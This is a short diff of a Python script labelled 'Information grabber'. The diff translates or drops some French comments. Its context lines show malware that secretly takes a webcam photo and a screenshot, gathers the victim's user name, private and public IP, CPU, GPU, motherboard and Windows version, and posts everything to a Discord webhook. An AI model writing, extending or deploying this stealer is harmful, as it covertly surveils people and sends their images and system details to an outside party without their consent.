@@ -28,7 +28,6 @@ else:
     ret, frame = cap.read()
 
     if ret:
-        # Sauvegarder l'image webcam
         photo_path = "photo_webcam.png"
         cv2.imwrite(photo_path, frame)
 
@@ -41,14 +40,14 @@ c = wmi.WMI()
 #Processeur
 cpu = platform.processor()
 
-#Carte graphique
+#GPU
 gpu = c.Win32_VideoController()[0].Name
 
-#carte mère (fabricant + modèle)
+#mother board
 baseboard = c.Win32_BaseBoard()[0]
 motherboard = f"{baseboard.Manufacturer} {baseboard.Product}"
 
-#Version de Windows
+
 windows_version = platform.platform()
 
 #take more information
@@ -104,7 +103,7 @@ if __name__ == "__main__":
     message = f"# Information grabber\n**⏲️Hour:** {time} \n**🛜IP private:** {ip_locale} \n**📶IP public:** {ip_publique} \n**🚹Name User:** {name_of_user} \n **🧠CPU:** {cpu}\n**🎮GPU: **{gpu}\n **🧩MotherBoard: **{motherboard}\n**Version of Windows: **{windows_version}\n## 📸Screenshot: "
 
 
-    # Envoi du message
+    
     send_discord_webhook(webhook_url, message, [image_path,photo_path])
 
 
